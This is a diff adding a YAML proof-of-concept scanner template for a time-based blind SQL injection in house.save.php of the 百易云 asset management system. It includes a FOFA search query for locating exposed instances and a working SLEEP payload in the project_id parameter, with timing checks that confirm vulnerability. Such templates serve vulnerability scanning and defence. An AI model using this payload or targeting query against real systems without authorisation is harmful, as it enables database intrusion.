@@ -1,0 +1,17 @@
+id: poc-yaml-baiyiyun-house-save-php-sqli
+info:
+  name: 百易云资产管理运营系统 house.save.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 百易云资产管理运营系统
+  fofa: body="不要着急，点此"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /adminx/house.save.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP({{.t1}})))OKTO)
+  expression: "status_code == 200 && \n!contains(body,\"<\") &&\ncontains(body,\"\
+    没有选择项目\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
